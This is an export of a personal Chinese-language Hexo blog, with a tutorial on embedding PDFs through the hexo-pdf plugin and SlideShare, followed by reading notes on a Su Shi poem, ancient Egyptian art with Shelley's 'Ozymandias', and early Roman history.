<ul>
<li>
<p>首先打开 <a href="https://hexo.io/plugins/">Plugins | Hexo</a> ，搜索pdf</p>
</li>
<li>
<p>然后就会找到唯一一个匹配项：<a href="https://github.com/superalsrk/hexo-pdf/">hexo-pdf</a></p>
</li>
</ul>
<h3 id="第二步"><a class="header-anchor" href="#第二步">¶</a>第二步</h3>
<ul>
<li>
<p><code>win+r</code></p>
</li>
<li>
<p><code>Ctrl+Shift+Enter</code> 以管理员身份打开cmd</p>
</li>
<li>
<p>cd到<code>hexo</code>目录</p>
</li>
<li>
<p><code>$ npm install --save hexo-pdf</code> 安装插件</p>
</li>
</ul>
<h3 id="第三步"><a class="header-anchor" href="#第三步">¶</a>第三步</h3>
<h4 id="插件提供三种方法"><a class="header-anchor" href="#插件提供三种方法">¶</a>插件提供三种方法</h4>
<ul>
<li>
<p>第一种 Normal PDF   没成功</p>
<ul>
<li><code>&#123;% pdf http://7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125; </code></li>
<li>第一个是链接引入，但是链接失效了，不知道咋搞的，先跳过</li>
<li><code>&#123;% pdf http://7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125;</code></li>
<li>第二个是引入本地pdf，看样子是放在<code>hexo</code>下某个位置，但是没试出来， so跳过（废×</li>
</ul>
</li>
<li>
<p>第二种  Google drive</p>
<ul>
<li><code>&#123;% pdf https://drive.google.com/file/d/0B6qSwdwPxPRdTEliX0dhQ2JfUEU/preview %&#125;</code></li>
<li>把文件传到云端硬盘，但是点开链接，发现需要申请访问权限emmmm</li>
<li>so跳过（废×</li>
</ul>
</li>
<li>
<p>第三种  SlideShare  √take</p>
</li>
</ul>
<h4 id="SlideShare"><a class="header-anchor" href="#SlideShare">¶</a>SlideShare</h4>
<h5 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h5>
<ul>
<li>
<p><code>&#123;% pdf http://www.slideshare.net/slideshow/embed_code/key/8Jl0hUt2OKUOOE %&#125;</code></p>
</li>
<li>
<p>复制其中链接可以直接开始浏览文件</p>
</li>
</ul>
<h5 id="Step-1-注册，上传文件"><a class="header-anchor" href="#Step-1-注册，上传文件">¶</a>Step 1   注册，上传文件</h5>
<ul>
<li>访问<code>http://www.slideshare.net</code>（需要魔法访问）</li>
<li>用Google账号注册，登录</li>
<li>右上角Upload，将文件拖拽到指定区域，随便填写一些信息上传</li>
<li>上传成功后点击右上角个人头像，打开<code>My Uploads</code>，点开刚刚上传得到pdf，苯人的第一次试验文件链接是<code>https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532</code>，可以看到文件名有显示出来，但是这个链接跟上面的示例不是一个格式，用这个链接多次尝试也无法在<code>hexo s</code>显示</li>
<li>【因为苯人还不会插本地图片【感谢好友hsad提醒^^文件上传】】所以此处缺少很多示例图片</li>
</ul>
<h5 id="Step-2-提取可访问链接"><a class="header-anchor" href="#Step-2-提取可访问链接">¶</a>Step 2   提取可访问链接</h5>
<ul>
<li>
<p>在<code>https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532</code> ，找到【…】按钮，选择<code>share</code>，复制<code>Embed</code>部分内容</p>
<p>复制内容如下：</p>
</li>
<li>
<p><code>&lt;iframe src=&quot;https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1&quot; width=&quot;597&quot; height=&quot;486&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px;max-width: 100%;&quot; allowfullscreen&gt;&lt;/iframe&gt;&lt;div style=&quot;margin-bottom:5px&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.slideshare.net/slideshow/linux-saveqimo-dontlook-thanku-testhexo2024-pdf/270211532&quot; title=&quot;Linux-saveQiMo-dontLook-thanku-testhexo2024.pdf&quot; target=&quot;_blank&quot;&gt;Linux-saveQiMo-dontLook-thanku-testhexo2024.pdf&lt;/a&gt;&lt;/strong&gt; from &lt;strong&gt;&lt;a href=&quot;https://www.slideshare.net/1300672728&quot; target=&quot;_blank&quot;&gt;1300672728&lt;/a&gt;&lt;/strong&gt;&lt;/div&gt;</code></p>
</li>
<li>
<p>在这一大串东西里面有一串可疑链接，跟示例很像，遂提取出来：</p>
</li>
<li>
<p><code>https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1</code>【这个startSlide留着也行】</p>
</li>
</ul>
<h5 id="Step-3-插件使用与测试"><a class="header-anchor" href="#Step-3-插件使用与测试">¶</a>Step 3   插件使用与测试</h5>
<ul>
<li><code>&#123;% pdf https://www.slideshare.net/slideshow/embed_code/key/3CgGrJHCWZ1orO?startSlide=1 %&#125;</code></li>
<li>然后本地和github page测试，都可以显示【此处暂缺少效果图hhh】，over了</li>
</ul>
<h3 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h3>
<ul>
<li>
<p>搞完才找到教程（汗）</p>
</li>
<li>
<p>此处贴上链接，作为后续SlideShare方法失效（没找到相关信息，比如文件保存期限，文件数量上限啥的）的辅助方法</p>
</li>
<li>
<p><a href="https://blog.csdn.net/wugenqiang/article/details/88377669">使用 Github 空间搭建 Hexo 技术博客——Hexo NexT主题内添加pdf 插件（十一）_hexo next添加github上的插件-CSDN博客</a></p>
</li>
<li>
<p>这个教程的方法还有下载功能，goodgood</p>
</li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>hexo notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>【人间烟火皆是诗】海棠-苏轼</title>
    <url>/project/2024/07/22/%E6%96%87%E5%8F%B2%E5%93%B2/%E8%AF%97%E6%96%87%E8%AF%8D/%E3%80%90%E4%BA%BA%E9%97%B4%E7%83%9F%E7%81%AB%E7%9A%86%E6%98%AF%E8%AF%97%E3%80%91%E6%B5%B7%E6%A3%A0-%E8%8B%8F%E8%BD%BC/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>今日读诗，bgm是白光的金曲</p>
<p>BV1ok4y1L7Y1</p>
<h3 id="从此始"><a class="header-anchor" href="#从此始">¶</a>从此始</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">海棠·东风袅袅泛崇光</span><br><span class="line">		苏轼</span><br><span class="line">           东风袅袅泛崇光，香雾空蒙月转廊。</span><br><span class="line">           只恐夜深花睡去，故烧高烛照红妆。</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>他在《自题金山画像》中说：“心似已灰之木，身如不系之舟。问汝平生功业，黄州惠州儋州。”这是苏轼对自己一生的总结，很淡然。在长达十年的外放期间，苏轼创作了大量优秀的作品，这首《海棠》就是其在被贬黄州期间写作的。</p>
</li>
<li>
<p>海棠是一种落叶小乔木，树姿优美，叶子椭圆形，春天开白花或者粉红色花，入秋后，金果满树，芳香袭人。海棠一直被古代文人视为珍品，也有大量有关海棠的诗词流传。如南宋李清照那首家喻户晓的《如梦令》：“昨夜雨疏风骤，浓睡不消残酒。试问卷帘人，却道海棠依旧。知否，知否？应是绿肥红瘦。”</p>
</li>
<li>
<p>第三、四句“只恐夜深花睡去，故烧高烛照红妆”，化用了唐明皇和杨贵妃的典故。</p>
<ul>
<li>东坡作《海棠》诗曰：“只恐夜深花睡去，高烧银烛照红妆。”事见《太真外传》，曰：“上皇登沈香亭，诏太真妃子。妃于时卯醉未醒，命力士从侍儿扶掖而至。妃子醉颜残妆，鬓乱钗横，不能再拜。上皇笑曰：‘是岂妃子醉，真海棠睡未足耳。’”   ——宋 释慧洪 《冷斋夜话》 卷一</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">寓居定惠院之东杂花满山有海棠一株土人不知贵也</span><br><span class="line">				苏轼</span><br><span class="line">	江城地瘴蕃草木，只有名花苦幽独。</span><br><span class="line">          嫣然一笑竹篱间，桃李漫山总粗俗。</span><br><span class="line">          也知造物有深意，故遣佳人在空谷。</span><br><span class="line">          自然富贵出天姿，不待金盘荐华屋。</span><br><span class="line">          朱唇得酒晕生脸，翠袖卷纱红映肉。</span><br><span class="line">          林深雾暗晓光迟，日暖风轻春睡足。</span><br><span class="line">          雨中有泪亦凄怆，月下无人更清淑。</span><br><span class="line">          先生食饱无一事，散步逍遥自扪腹。</span><br><span class="line">          不问人家与僧舍，拄杖敲门看修竹。</span><br><span class="line">          忽逢绝艳照衰朽，叹息无言揩病目。</span><br><span class="line">          陋邦何处得此花，无乃好事移西蜀？</span><br><span class="line">          寸根千里不易致，衔子飞来定鸿鹄。</span><br><span class="line">          天涯流落俱可念，为饮一樽歌此曲。</span><br><span class="line">          明朝酒醒还独来，雪落纷纷那忍触。	</span><br></pre></td></tr></table></figure>
<ul>
<li>“天涯流落俱可念，为饮一樽歌此曲。明朝酒醒还独来，雪落纷纷那忍触。”这首著名的咏海棠诗，至此才点明主题。诗人绝不是为咏海棠而咏海棠，而是惊诧名花海棠竟然落户江城黄州，而自己身怀随和之宝却被贬黄州，一个是花中之魁，一个是人中之杰，命运竟如此相似。为和海棠巧遇而痛饮一杯，歌此一曲。明朝酒醒还独来，免得海棠花落时自己更伤心。</li>
<li>这首诗的妙处不在于诗人对海棠的描摹，而在于诗人咏物抒怀之时，将自己与海棠融为一体。</li>
<li>bb：这首诗真的，感觉苏轼他真的超爱，这个辞藻和意境的雕刻。自分最喜欢的几句有：
<ul>
<li>“林深雾暗晓光迟，日暖风轻春睡足。”</li>
<li>“ 雨中有泪亦凄怆，月下无人更清淑。”</li>
<li>“忽逢绝艳照衰朽，叹息无言揩病目。”</li>
<li>“陋邦何处得此花，无乃好事移西蜀？”</li>
<li>“明朝酒醒还独来，雪落纷纷那忍触。”</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>诗文词</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>诗文词</tag>
      </tags>
  </entry>
  <entry>
    <title>【艺术史】来世与王权的艺术——古埃及艺术</title>
    <url>/project/2024/07/04/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E5%9F%83%E5%8F%8A%E5%8F%B2/%E3%80%90%E8%89%BA%E6%9C%AF%E5%8F%B2%E3%80%91%E6%9D%A5%E4%B8%96%E4%B8%8E%E7%8E%8B%E6%9D%83%E7%9A%84%E8%89%BA%E6%9C%AF%E2%80%94%E2%80%94%E5%8F%A4%E5%9F%83%E5%8F%8A%E8%89%BA%E6%9C%AF/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1Dg411t7nz/?spm_id_from=333.999.0.0">视频的地址</a>  是偶然发现的一个up主，自分作为埃及历史文化爱好者=不能错过！</p>
<p>当时所有的自行记录都在幕布，所以整理起来发现都是一些凌乱的句子集（捂脸） 后面有心思了可能会完善吧！（？</p>
<p>而且是视频看了一半才想起来记录的，所以这个markdown只有后面一半部分！前半部分有机会补上吧！（？</p>
<h3 id="摘录始于此"><a class="header-anchor" href="#摘录始于此">¶</a>摘录始于此</h3>
<p>艺术是一面镜子，我们能够从中看到的东西取决于我们的知识储备和受教育水平。</p>
<p>古王国时期是艺术发展的黄金时代，这一时期的艺术风格恢弘、稳重、自信，大多数的艺术形式和艺术程式已经确定下来，形成了传统。</p>
<p>五个世纪以来，王权制度慢慢侵蚀了埃及的经济活力，使其再也无法支撑一个庞大的中央集权政府。</p>
<p>（在第一中间期）尽管从在着各种困难，但由于总督们摆脱了法老获得了独立，各个地方的艺术创造力得到了激发，古埃及进入了一个文化多元发展的时期。</p>
<p>总的来说，中王国时期的艺术在细部上有所创新，但在大体上还是遵循了古王国时期的传统。</p>
<p>不论是对于一个王朝也好，还是对于一个个人也好，对于其成长和发展来说必不可少的一件事就是回溯历史。</p>
<p>法老是一位女性，这对于埃及传统来说是一次巨大的挑战，但这件事却并非是无源之水，无本之木，而是有其现实基础的。</p>
<p>有一个普遍规律，就是女性能够成为统治者的前提，是这一时期该地区对于女性的地位是有普遍认知的，并且女性的权益是可以得到保障的。</p>
<p>而根据古埃及的法律，社会成员所拥有的权利取决于他所处的社会地位而非性别。</p>
<p>在古代的社会当中，古埃及的妇女地位相对较高。女性在几乎所有领域都与男性平等，她们享有拥有、继承和遗嘱自己财产的权利。</p>
<p>而“法老”是埃及统治者的称呼，它无关性别。</p>
<p>即使如此，一位女性成为法老还是很罕见的，她必然面临着来自传统的压力和质疑，而这必然会对她的执政合法性构成挑战。</p>
<h4 id="哈特谢普苏特"><a class="header-anchor" href="#哈特谢普苏特">¶</a>哈特谢普苏特</h4>
<p>她在自己的女性身份和传统之间找到了一个平衡点。而在这个过程当中，艺术起到了关键的作用。</p>
<h5 id="哈特谢普苏特的“三板斧”"><a class="header-anchor" href="#哈特谢普苏特的“三板斧”">¶</a>哈特谢普苏特的“三板斧”</h5>
<p>首先是在对外政策方面，在她掌权期间埃及停止了对外战争，转而大力发展和邻国之间的贸易往来，这使得国内的经济迅速繁荣，财富迅速增长；然后是在宗教方面，她宣称自己是阿蒙神之女，这样她的统治就不需要经由和图特摩斯二世的婚姻，而是完全来自于宗教；最后，她通过在埃及大规模的兴建纪念性建筑和雕像来对民众施加影响力，其目的是在于塑造自己的形象，推广自己的成就。</p>
<p>这些建筑和雕像可以迫使民众习惯于看到一个女性统治者的形象，并且接受相应的宗教叙事。这样可以确保当她（哈特谢普苏特）宣称自己为法老的时候，埃及社会不会产生太大的震动。</p>
<p>埃及艺术程式“概念性”的特点再次体现了出来：表现法老的艺术程式不是为了塑造某个具体的人，而是塑造一个概念化的形象，一个符合传统要求的形象。这里也能看出埃及人对于传统的重视。</p>
<p>埃赫那顿的统治不仅见证了一个新首都的建立和一个新宗教的兴起，它也导致了这一时期传统艺术程式的彻底改变，产生了一种新的“阿玛纳风格”（阿玛纳艺术）。</p>
<p>阿玛纳风格自然、生动、充满个性，这是古埃及艺术史上一次出现比较大的风格变化，可能也是唯一的一次。</p>
<p>后世对于这种风格的评价呈现出两极分化的趋势。</p>
<p>这种新的艺术风格就如同他的宗教改革一样极具争议。</p>
<h5 id="视频作者的一些观点"><a class="header-anchor" href="#视频作者的一些观点">¶</a>视频作者的一些观点</h5>
<p>我认为这场宗教改革改变了埃及文化的核心价值，这个特别的法老形象（指埃赫那顿）和阿玛纳风格所反映出的正是这一时期埃及的主流价值。</p>
<p>前面提到，埃及传统文化的核心价值是玛亚特。在这种价值之下，传统的艺术程式所强调的事永恒与秩序，永恒与秩序在法老雕像上面体现出的就是一种“阳刚之美”，甚至很多女性雕像也体现出了男性的特质。</p>
<p>而宗教改革所造成的结果就是传统价值——玛亚特缺失了，或者至少可以说是玛亚特被削弱了。</p>
<p>这种价值的改变可能就造成了埃及人不再追求来世的永恒，而是转而追求现世的美好。</p>
<p>于是，自然、生动、世俗、柔软、充满个性的新艺术风格随之出现，而这种新的艺术风格在法老雕像上面所呈现出的就是女性化的“阴柔之美”。</p>
<p>究其原因，这是由于宗教改革改变了文化的核心价值。</p>
<p>在埃及社会，宗教要比政治重要得多；相比于政治，宗教对艺术产生的影响也要深刻得多。</p>
<p>可能可以佐证这一观点的事实：这一时期所留存下来的墓葬浮雕当中不再有关于来世和死亡的描写。</p>
<p>主流学术界和艺术通史书籍对于埃赫那顿巨像的评价普遍偏负面，他们认为这个雕像是难看的，是不讨人喜欢的。</p>
<p>而他们对于阿玛纳风格的态度则褒贬不一，原因在于阿玛纳艺术自然、轻松的风格在古埃及程式化的艺术当中独树一帜，让人印象深刻。</p>
<p>奈菲尔提提半身像在德国辗转的这85年也是德国风云变幻的85年。</p>
<p>对于德国来说，这件作品的意义早已经超越了艺术范畴，它已经和德国的民族认同和柏林文化联系在了一起。</p>
<p>到这里也就不难理解为什么德国当局对于这件作品的态度如此坚决。</p>
<p>在古埃及艺术充满“象征性”和“正确性”的大环境当中，阿玛纳风格对于具体的人的关怀是很罕见的。</p>
<p>以上小结：阿玛纳时期的艺术相较于传统艺术咋风格上有较大的差异，其原因可能在于埃赫那顿的宗教改革造成了文化核心价值的改变。</p>
<h4 id="阿玛纳风格"><a class="header-anchor" href="#阿玛纳风格">¶</a>阿玛纳风格</h4>
<p>相比之前“静态”的传统风格，阿玛纳风格是“动态的”，其特点是放松、自然、充满“运动感”和“活动感”。</p>
<p>浮雕的主要表现方式为柔和的曲线而非僵硬的直线，所表现的神只有阿顿，没有其他的神。也没有关于死亡和来世的描写。</p>
<p>神庙通常是露天的，没有顶部</p>
<p>人物特征为细长的头部，摇摆的姿态，修长的四肢和突出的肚子。</p>
<p>在构图上相较于传统对于“秩序”的强调，阿玛纳风格显得较为“混乱”。</p>
<p>相较于传统雕像所体现出的“永恒感”和“力量感”（肌肉感），阿玛纳风格的雕像缺乏力量感，而且具有明显的女性化特征，体现出的是一种“阴柔美”。</p>
<p>相较于传统艺术程式对人物所进行的“概念化”描绘，阿玛纳风格侧重于对人物进行“个性化”的表现。</p>
<p>通过对比可以发现，哈特谢普苏特时期的艺术变革是发生在表层的，而阿玛纳时期的艺术变革是发生在深层的。</p>
<p>相比于政治，宗教对艺术的影响要深刻得多。</p>
<h5 id="视频作者的理解"><a class="header-anchor" href="#视频作者的理解">¶</a>视频作者的理解</h5>
<p>世界是一个全面的、联系的、发展的整体，历史是求变的，不论是埃及传统还是艺术程式，它发展到一定程度必然会发生一次突变。</p>
<h4 id="埃赫那顿-宗教改革"><a class="header-anchor" href="#埃赫那顿-宗教改革">¶</a>埃赫那顿&amp;宗教改革</h4>
<p>埃赫那顿和他的宗教改革就是埃及这个文化系统当中的一次突变。</p>
<p>而这次突变会给这个系统注入新的元素，让它继续发展。在后面的作品当中我们仍然能够看到一些阿玛纳风格的影子</p>
<p>在古埃及的陵墓当中，真正的诅咒其实非常罕见，这些“诅咒”通常和墓葬文书当中的咒语相混淆。</p>
<p>然而这些“诅咒”的确有科学上可以解释的原因，例如细菌或者辐射；</p>
<p>后来这些说法和历史结合在了一起，再加上能够让人信服的证据就构成了故事的传播基础，而这些故事后来又随着纪录片和相关的书籍广为流传</p>
<p>但近些年来“法老的诅咒”更多的是作为一种文化元素存在，为各种电影和游戏提供灵感和素材</p>
<p>祭司和抄写员会将来世之旅的过程记录在一个莎草纸卷轴上，然后将这些卷轴和死者一同下葬，这样他们就不会在冥界迷路了。</p>
<p>后来，学者们就将这种图文并茂的古埃及卷轴称为“亡灵书”。</p>
<p>人在第一次死亡之后灵魂会进入冥界，但每个灵魂通过冥界的方式各有不同，方式的选择取决于他们的地位。</p>
<p>通往来世的道路十分艰难，路上会有可怕的生物阻拦灵魂的前行。这时就需要灵魂吟唱亡灵书当中适当的咒语来安抚他们。</p>
<p>当灵魂经历重重险阻穿越冥界之后，他们会到达玛亚特大厅。这里是来世旅程当中最重要的部分，灵魂要在这里接受审判。</p>
<p>每个人的结局都各有不同，而灵魂的纯洁性将是他们能否被允许进入奥西里斯天国的决定性因素。</p>
<p>来世信仰，或者说古埃及文明就是一场永恒的“接力赛”。埃及人将人的死亡与重生和太阳的升起与落下联系在一起，生者的世界和亡者的世界是一个联系的整体，它们都是玛亚特这个更广泛秩序的一部分。</p>
<p>“如果没有来世信仰，埃及社会将失去凝聚力”。从这个角度来说，我们可以将古埃及文明称为“来世的文明”。</p>
<p>古埃及人所渴望的永恒就蕴藏在自己的生活当中，透过“轮回、秩序与永恒”这些在艺术作品当中反复出现的主题，所体现出的其实是埃及人对于生命的渴望和对于死亡的敬畏。</p>
<p>用佛教的话来说，人生是一场修行。</p>
<p>以上小结：亡灵书的形式感很重，它所体现出的是传统的秩序感和永恒感。</p>
<p>除了实用性和故事性，亡灵书也是埃及少见的具有明确道德内容的作品。</p>
<p>亡灵书当中的每一个“我没有…”都蕴含着一个“你不应该”的潜在含义。</p>
<p>拉美西斯二世既满足了人们对于一个曾经存在过的、无限辉煌的文明的想象，同时他也满足了人们对于一个拥有不世功绩，却又自命不凡的帝王的想象。</p>
<p>宗教、语言和文字是一个文明的重要载体，其重要性不言而喻。而随着宗教的衰落，虽然当地的居民仍然说着他们的语言，但随着神庙作用的降低和掌握着文字的祭司的减少，人们阅读和书写象形文字的能力慢慢也就消失了。</p>
<h4 id="罗塞塔石碑与现代埃及学"><a class="header-anchor" href="#罗塞塔石碑与现代埃及学">¶</a>罗塞塔石碑与现代埃及学</h4>
<p>石碑上刻有三种文字，上面的为埃及的正式书写文字，象形文字，也被称为“圣书体”；中间是另一种古埃及文字，被称为“世俗体”；而最下方则是古希腊文字。</p>
<p>欧洲的学者对于古希腊文字相对熟悉，如果他们可以将三种文字对应起来的话应该就能破译象形文字。</p>
<p>石碑的破译工作以古希腊文字为起点，很多学者都参与了进来。</p>
<p>英国的学者托马斯·杨为破译象形文字做出了重要贡献，不过他更为著名的是建立了光的波动理论和进行了杨氏双缝干涉实验。</p>
<p>最后，成功破译象形文字的是法国学者商博良，而他也因此成为了埃及学的奠基人。</p>
<p>罗塞塔石碑的破译成为了现代埃及学的开端，自此人们终于找到了打开古埃及文明这座宝库的钥匙，让我们有机会了解这个辉煌的古老文明</p>
<h4 id="雪莱《奥兹曼迪亚斯》（拉美西斯二世）"><a class="header-anchor" href="#雪莱《奥兹曼迪亚斯》（拉美西斯二世）">¶</a>雪莱《奥兹曼迪亚斯》（拉美西斯二世）</h4>
<p>讽刺诗歌《Ozymandias/奥兹曼迪亚斯》中英文对照[波西·比希.雪莱]</p>
<p>Ozymandias（奥兹曼迪亚斯）被古代希腊称作埃及的Ramses II是一位威武的法老（国王），英国诗人雪莱有写了一首关于他的傲慢与灭亡来暗喻警示当时当权者的傲慢的诗。</p>
<p>诗歌是文学艺术最为凝练的表现形式。波西·比希.雪莱（Percy.Bysshe.Shelley）是19世纪英国<a href="http://www.timeface.cn/aiqing/lmqs">浪漫主义伟大诗人</a>的代表之一，其诗风古朴自然，极富韵律，而内容上也是极富个性，既有对自己情感的强烈表达，又有对大自然的欣赏和热爱，同时还有对封建权威、强权统治的反抗。雪莱笔下的“奥兹曼迪亚斯”（Ozymandias）就是这样一首承载了诗人对权威、传统的反抗的传世之作。对这首诗的诗歌主题进行分析研究的大有人在，然而，诗歌不仅是表意最凝练的方式，它更多地是一种文字艺术，因而，其形式本身也是一种艺术。本题拟将从表词达意（meaning）、意象（imagery）以及修辞手法（figure of speech）对“奥兹曼迪亚斯”进行梳理分析。</p>
<ul>
<li>
<p>《奥兹曼迪亚斯》中英文对照</p>
</li>
<li>
<p>英文原文</p>
</li>
<li>
<p>Ozymandias</p>
</li>
<li>
<p>I met a traveller from an antique land</p>
</li>
<li>
<p>Who said: &quot;Two vast and trunkless legs of stone</p>
</li>
<li>
<p>Stand in the desert. Near them on the sand,</p>
</li>
<li>
<p>Half sunk, a shattered visage lies, whose frown</p>
</li>
<li>
<p>And wrinkled lip and sneer of cold command</p>
</li>
<li>
<p>Tell that its sculptor well those passions read</p>
</li>
<li>
<p>Which yet survive, stamped on these lifeless things,</p>
</li>
<li>
<p>The hand that mocked them and the heart that fed.</p>
</li>
<li>
<p>And on the pedestal these words appear:</p>
</li>
<li>
<p>'My name is Ozymandias, King of Kings:</p>
</li>
<li>
<p>Look on my works, ye mighty, and despair!’</p>
</li>
<li>
<p>Nothing beside remains. Round the decay</p>
</li>
<li>
<p>Of that colossal wreck, boundless and bare,</p>
</li>
<li>
<p>The lone and level sands stretch far away.</p>
</li>
<li>
<p>中文翻译　　1. 奥兹曼迪亚斯（杨绛 译）</p>
</li>
<li>
<p>我遇见一位来自古国的旅人</p>
</li>
<li>
<p>他说：有两条巨大的石腿</p>
</li>
<li>
<p>半掩于沙漠之间</p>
</li>
<li>
<p>近旁的沙土中，有一张破碎的石脸</p>
</li>
<li>
<p>抿着嘴，蹙着眉，面孔依旧威严</p>
</li>
<li>
<p>想那雕刻者，必定深谙其人情感</p>
</li>
<li>
<p>那神态还留在石头上</p>
</li>
<li>
<p>而斯人已逝，化作尘烟</p>
</li>
<li>
<p>看那石座上刻着字句：</p>
</li>
<li>
<p>“我是万王之王,奥兹曼斯迪亚斯</p>
</li>
<li>
<p>功业盖物,强者折服”</p>
</li>
<li>
<p>此外，荡然无物</p>
</li>
<li>
<p>废墟四周，唯余黄沙莽莽</p>
</li>
<li>
<p>寂寞荒凉，伸展四方。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>文史哲</category>
        <category>世界史</category>
        <category>埃及史</category>
      </categories>
      <tags>
        <tag>reading</tag>
        <tag>世界史</tag>
        <tag>埃及史</tag>
      </tags>
  </entry>
  <entry>
    <title>【从城邦到帝国】1_罗马起源_王政时代</title>
    <url>/project/2024/07/06/%E6%96%87%E5%8F%B2%E5%93%B2/%E4%B8%96%E7%95%8C%E5%8F%B2/%E7%BD%97%E9%A9%AC%E5%8F%B2/%E3%80%90%E4%BB%8E%E5%9F%8E%E9%82%A6%E5%88%B0%E5%B8%9D%E5%9B%BD%E3%80%91-1-%E7%BD%97%E9%A9%AC%E8%B5%B7%E6%BA%90-%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p><a href="https://www.bilibili.com/video/BV1wd4y1h7pP/?spm_id_from=333.999.0.0&amp;vd_source=3f0983ef34615b702fec513c41e55a64">视频地址</a>   是之前很喜欢练习打字（×的一段时间，看视频然后一个个字打下来的，当时视频说一句话我打一句，一个二十分钟的视频得看两倍时间，现在想来还真是降低开发效率的一些操作（捂脸）  都存在幕布那边，这回一次性整理一下</p>
<h3 id="罗马起源-王政时代"><a class="header-anchor" href="#罗马起源-王政时代">¶</a>罗马起源 王政时代</h3>
<p>​	<em>亚平宁半岛</em>是罗马的起源之地，早在旧石器时代这里就有人类活动的迹象。随着人类族群的迁徙，居民成分也日趋复杂.</p>
<p>​	到公元前8世纪时，这里生活着自石器时代以来就住在这儿的原住民，比如利古里亚人、撒丁人；青铜时代前后来到这儿的印欧语系部落，比如翁布里亚人、萨宾人、拉丁人，还有一些来自小亚细亚的埃特鲁里亚人，以及从爱琴海那边来殖民的希腊人，最后是从阿尔卑斯翻山越岭而来的高卢人。而罗马的先民们，只是众多上古意大利居民中的一支，拉丁族的一个小部分。</p>
<p>​	公元前九到八世纪，一些部落迁移到帕拉丁、厄斯魁林、奎里纳尔等七个山丘定居，进而形成了数个村落。后来，几个村落逐渐联合起来，称七丘联盟。其中生活在帕拉丁山罗马村的拉丁人，成了这个联盟的核心，这就是早期的罗马王国。</p>
<p>​	关于罗马城的建立，其实还有一个传说：</p>
<p>​		<strong>努米托尔</strong>和<strong>阿穆利乌斯</strong>兄弟俩是特洛伊城的王子埃涅阿斯的后代，努米托尔是阿尔巴朗格的国王，阿穆利乌斯掌管国家宝库。但是，阿穆利乌斯不满现有的权力，于是他篡夺了努米托尔的王位。</p>
<p>​		为了防止努米托尔的后代报复，阿穆利乌斯就强迫努米托尔唯一的女儿雷亚·<strong>西尔维娅</strong>去做维斯塔贞女，因为贞女是不能结婚的。但是，西尔维娅与战神马尔斯相遇后，坠入爱河，生了两个孩子，分别叫<strong>罗穆路斯</strong>和<strong>雷穆斯</strong>。</p>
<p>​		阿穆利乌斯知道此事后十分恼怒，便把西尔维娅给活埋了，她的两个孩子也被扔到了野外。幸运的是，两个弃婴经过一头母狼的乳汁哺育而活了下来。后来，一个叫浮士德的牧羊人发现了兄弟俩并带回家抚养。</p>
<p>​		长大后，他们向阿穆利乌斯复仇，最终帮助努米托尔夺回王位，而城中的难民、流浪者和奴隶被兄弟俩带走，其中大多数人是男性。</p>
<p>​		他们决定一起在别处另建一座新城，但是兄弟俩因为城市选址的问题发生了争执，罗穆路斯便杀死了雷穆斯，并以自己的名字，给这座新城取名为罗马，而<u>罗穆路斯就成成为罗马的第一位王</u>。</p>
<p>​	这一年，是公元前753年。以此为起点，罗马进入王政时代。</p>
<p>​	早期的罗马人口结构失衡，男多女少。为了种族的延续，罗马的男人在罗穆路斯带领下，决定想办法抢隔壁村萨宾人的女人。</p>
<p>​	他们举办了一场大宴会，不少<strong>萨宾人</strong>拖家带口来参加盛宴。</p>
<p>​	就在大家享受美食之际，罗穆路斯突然令手下对萨宾人尤其是他们的女人下手。</p>
<p>​	700多萨宾女人被绑到罗马，后来成为罗马人的妻子。</p>
<p>​	萨宾人与罗马之间数次交战，各有胜负。</p>
<p>​	就在双方又要爆发新一次的战争之际，这时，被罗马人抢走的女人们站了出来劝双方和解。因为这时候早就已经生米煮成熟饭了，大家都是亲戚了。双方首领也意识到，与其刀戈相向，不如和睦相处。于是<u>罗马人与萨宾人从此合并</u>。</p>
<p>​	王政早期，罗马社会是一种依托血缘关系的氏族社会。包括三个部族，分别是拉丁人、埃特鲁里亚人和萨宾人。</p>
<p>​	每个部族又包括十个胞族（Curia）又称库里亚。每个胞族又包括十个氏族（Gentes）。</p>
<p>​	其中氏族的头领、贵族在一起议事，就形成了长老议事会，或者称<strong>元老院</strong>。</p>
<p>​	也就是说，这三个部族、三十个胞族和三百个氏族，组成了最初的罗马公民。</p>
<p>​	在这种体系之下，罗马的国家管理机构分别是勒克斯（Rex）/王、长老议事会/元老院和库里亚大会</p>
<p>​	其中，勒克斯就是国王。</p>
<p>​	“国之大事，在祀与戎”。罗马也不例外。</p>
<p>​	国王掌管军政、司法、宗教大权，由选举产生，不能世袭。</p>
